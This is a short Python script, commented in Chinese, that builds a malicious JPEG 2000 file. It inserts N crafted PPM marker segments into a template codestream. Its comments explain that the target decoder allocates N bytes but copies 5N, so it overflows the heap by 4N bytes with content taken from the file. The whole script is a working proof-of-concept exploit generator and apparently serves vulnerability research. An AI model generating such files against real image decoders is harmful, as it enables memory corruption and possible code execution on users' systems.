import struct
import sys

# mk_ppm.py <模板> <out> <N>  —— 插入 N 个 PPM 标记，每个 [Zppm][Nppm=1][1字节]
#   pass1 只累加 Nppm  => alloc = N
#   pass2 按 m_data_size 整段 memcpy（含4字节Nppm头）=> 复制 5N
#   => 溢出 4N 字节，内容来自文件

TPL, OUT = sys.argv[1], sys.argv[2]
N = int(sys.argv[3]) if len(sys.argv) > 3 else 200

d = open(TPL, 'rb').read()
soc = d.find(b'\xff\x4f')
si = d.find(b'\xff\x51', soc)
siz_end = si + 2 + struct.unpack('>H', d[si + 2:si + 4])[0]
orig_tlm = d.find(b'\xff\x55', soc)
orig_tlm_end = orig_tlm + 2 + struct.unpack('>H', d[orig_tlm + 2:orig_tlm + 4])[0]
first_sot = d.find(b'\xff\x90', soc)

mid = d[orig_tlm_end:first_sot]          # COD/QCD/COM
head = bytearray(d[:siz_end]) + bytearray(mid)

ppm = bytearray()
for z in range(N):
    body = bytes([z & 0xFF]) + struct.pack('>I', 1) + b'Z'
    L = 2 + len(body)
    if L > 0xFFFF:
        sys.exit('L too big')
    ppm += b'\xff\x60' + struct.pack('>H', L) + body

out = head + ppm + d[first_sot:]
open(OUT, 'wb').write(bytes(out))
print('OK N=%d len=%d PPM_bytes=%d alloc_expected=%d copy_expected=%d' %
      (N, len(out), len(ppm), N, 5 * N))